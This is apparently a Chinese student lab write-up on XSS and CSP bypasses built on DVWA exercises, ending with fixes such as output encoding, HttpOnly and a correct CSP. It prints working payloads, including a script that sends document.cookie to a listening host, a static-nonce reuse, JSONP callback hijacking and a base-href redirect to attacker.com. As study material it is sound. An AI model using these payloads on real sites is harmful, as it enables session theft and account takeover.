# XSS 跨站脚本（Cross-Site Scripting）

> 一句话概述：浏览器把用户输入的恶意数据当成了代码执行。对应 CWE-79，属于 OWASP Top 10 的「注入」类风险。CSP（内容安全策略）是限制脚本来源的「白名单」，但配置不当会导致防线形同虚设。

## 一、漏洞原理

XSS 的本质是浏览器将用户输入当作 HTML/JavaScript 解析执行。攻击者注入的恶意脚本会在其他用户的浏览器中运行，从而窃取 Cookie、伪造操作或钓鱼。

## 二、三种类型的 XSS

| 类型 | 原理 | 危害 |
|------|------|------|
| 反射型 | 恶意代码不存储在服务器，通过 URL 参数反射回浏览器立即执行 | 需诱导受害者点击链接，窃取 Cookie、钓鱼 |
| 存储型 | 恶意代码永久存储在服务器（如留言板），任何访问者都中招 | 危害最大，可感染所有访问者 |
| DOM 型 | 不经过后端，纯前端 JS 把不可信数据（如 location.hash）写入 DOM | 服务器侧不可见，更难防御 |

### 1. 反射型 XSS

```html
<!-- 基础弹窗 -->
<script>alert("XSS")</script>

<!-- Medium 绕过黑名单：大小写混用或事件属性 -->
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>

<!-- 窃取 Cookie -->
<script>document.location="http://127.0.0.1:8888/steal?cookie="+document.cookie</script>
```

### 2. 存储型 XSS

留言板场景。Medium 难度下前端 `Name` 框有 `maxlength="10"` 限制、`Message` 框被 `strip_tags` 过滤，但 `Name` 框只过滤了 `<script>` 未过滤 `<img>`。绕过方式：用 F12 修改前端 `maxlength` 属性，注入短小的 `<img src=x onerror=alert(1)>`（需控制在数据库字段长度限制内）。

### 3. DOM 型 XSS

```html
<!-- Low：直接改 URL 参数 -->
?default=<script>alert(document.cookie)</script>

<!-- Medium：前端黑名单过滤 script，用 HTML 闭合绕过 -->
?default=</option></select><img src=x onerror=alert(document.cookie)>

<!-- High：白名单只允许特定语言，利用前后端认知差 -->
?default=English #<script>alert(1)</script>
```

## 三、CSP（内容安全策略）绕过实战

### 1. Low：白名单域滥用（CDN 信任漏洞）

策略信任了可自由上传内容的公共 CDN（如 `cdn.jsdelivr.net`），攻击者把恶意脚本托管在 CDN 上借壳执行：

```html
<script src="https://cdn.jsdelivr.net/gh/digininja/csp_bypass/alert.js"></script>
```

### 2. Medium：静态 Nonce 与 unsafe-inline 缺陷

策略同时包含 `'unsafe-inline'` 和写死的静态 nonce（Base64 值「Never going to give you up」）。绕过方式：直接注入内联脚本，或复用静态 nonce：

```html
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)</script>
```

### 3. High：同源 JSONP 回调劫持

策略 `script-src 'self'` 极度严格，但页面同源的 `jsonp.php` 未过滤 `callback` 参数。由于请求同源，完全符合 CSP 策略：

```text
jsonp.php?callback=alert(document.cookie)
```

### 4. 进阶：base-uri 缺失

若 CSP 未定义 `base-uri`，可注入 `<base href="https://attacker.com/">`，使页面所有相对路径脚本被迫从攻击者服务器加载，绕过 `script-src 'self'`。

## 四、实战踩坑与解决思路

### 存储型 XSS 失败的三点原因分析

在 DVWA Medium 打 `<img src=x onerror=alert(document.cookie)>` 失败时，逐条排查：

1. **前端限制（致命伤）**：Name 框写死 `maxlength="10"`，`onerror=...` 根本敲不进去，未闭合标签无法触发事件；
2. **后端过滤**：Message 框被 `strip_tags()` 剥离所有 HTML 标签；Name 框只过滤 `<script>` 不过滤 `<img>`，所以 `<img>` 要放 Name 框；
3. **数据库长度限制**：F12 改掉 maxlength 后，完整 payload 共 43 字符，但 name 字段上限约 50，超长仍被截断。

### DOM 型逃逸原理

`</option></select>` 的作用：先闭合原 `<option value='...'>` 和 `<select>` 标签，让后面的 `<img>` 脱离属性上下文成为独立标签。

### CSP 绕过的「门卫 vs 黑客」比喻

| 关卡 | 门卫（CSP）怎么想的 | 黑客怎么骗他的 | 核心漏洞点 |
|------|-------------------|--------------|-----------|
| Low | 信任 CDN 白名单 | 把恶意脚本托管到 CDN 借壳执行 | 信任第三方可控资源 |
| Medium | 有静态通行证就行 | 偷看 nonce 或直接把代码贴脸上 | 配置偷懒形同虚设 |
| High | 只有自己人才能执行 | 骗内部 JSONP 接口喊出恶意代码 | 业务逻辑动态生成恶意脚本 |

## 五、防御与修复方案

1. **输出编码（根本）**：对用户输入做上下文相关的 HTML 实体编码（如 `htmlspecialchars`）。按数据插入的上下文（HTML 正文/属性/JS 变量/URL）选择对应编码方式。
2. **HttpOnly Cookie**：关键 Cookie 加 `HttpOnly`，禁止 JS 读取。

```php
setcookie("session", $value, 0, "/", "", false, true); // 最后一个 true 即 HttpOnly
```

3. **内容安全策略（CSP）**：禁用 `unsafe-inline`；nonce 必须密码学随机且每次请求更新；严格校验 JSONP 的 callback 参数；补全 `base-uri 'none'` 和 `object-src 'none'`。

> CSP 只是缓解措施，最核心的防御仍在于修复后端代码漏洞（消除 XSS 注入点）。

## 参考来源

- 《第六周-XSS注入.docx》实战报告
- 《第二部分-Web安全核心操作流程.docx》第 6 周
- OWASP. "XSS (Cross Site Scripting) Prevention Cheat Sheet." *OWASP Cheat Sheet Series*, cheatsheetseries.owasp.org.
